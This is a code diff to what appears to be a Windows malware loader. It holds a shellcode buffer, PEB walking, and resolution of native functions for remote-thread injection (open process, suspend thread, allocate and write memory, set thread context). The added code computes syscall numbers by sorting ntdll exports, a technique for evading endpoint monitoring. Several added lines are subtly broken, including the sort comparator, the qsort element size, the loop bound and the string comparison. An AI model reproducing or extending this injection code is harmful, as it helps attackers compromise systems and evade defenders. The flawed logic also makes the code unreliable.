@@ -80,7 +80,10 @@ unsigned char buf[] =
 "\xb8\x43";
 
 
+char sort(const void* n1, const void* n2) {
 
+	return(*(char*)n1 - *(char*)n2);
+}
 
 size_t GetModHandle(wchar_t* ln) {
 	PEB* pPeb = (PEB*)__readgsqword(0x60);
@@ -148,6 +151,7 @@ DWORD GetFuncAddr(size_t modb, char* fn) {
 			//g("Function address: 0x%p", funcAddr);
 			// unsigned char* stubBytes[] = { 0x4C,  0x8B, 0xD1, 0xB8 };
 			//DWORD ssn = (unsigned char*)(funcAddr + 4)[0]
+			
 			ptr[nindex] = name;
 			nindex++;
 
@@ -159,8 +163,16 @@ DWORD GetFuncAddr(size_t modb, char* fn) {
 	}
 
 	int n = sizeof(ptr) / sizeof(ptr[0]);
-	qsort(ptr, n, sizeof(ptr), stricmp());
+	qsort(ptr, n, sizeof(ptr), sort);
 
+	for (size_t j = 0; j < sizeof(ptr);j++) {
+
+
+		if (ptr[j] == fn) {
+			i("ssn is %d", j + 4);
+			return((DWORD)j+4);
+		}
+	}
 	
 
 
@@ -184,7 +196,7 @@ DWORD GetFuncAddr(size_t modb, char* fn) {
 		 wrdNtOpenThread = (DWORD)GetFuncAddr(kb, "NtOpenThread");
 		 wrdNtOpenProcess = (DWORD)GetFuncAddr(kb, "NtOpenProcess");
 		 wrdNtSuspendThread = (DWORD)GetFuncAddr(kb, "NtSuspendThread");
-		wrdNtGetContextThread = (DWORD)GetFuncAddr(kb, "NtGetContextThread");
+		 wrdNtGetContextThread = (DWORD)GetFuncAddr(kb, "NtGetContextThread");
 		 wrdNtAllocateVirtualMemory = (DWORD)GetFuncAddr(kb, "NtAllocateVirtualMemory");
 		 wrdNtWriteVirtualMemory = (DWORD)GetFuncAddr(kb, "NtWriteVirtualMemory");
 		 wrdNtSetContextThread = (DWORD)GetFuncAddr(kb, "NtSetContextThread");
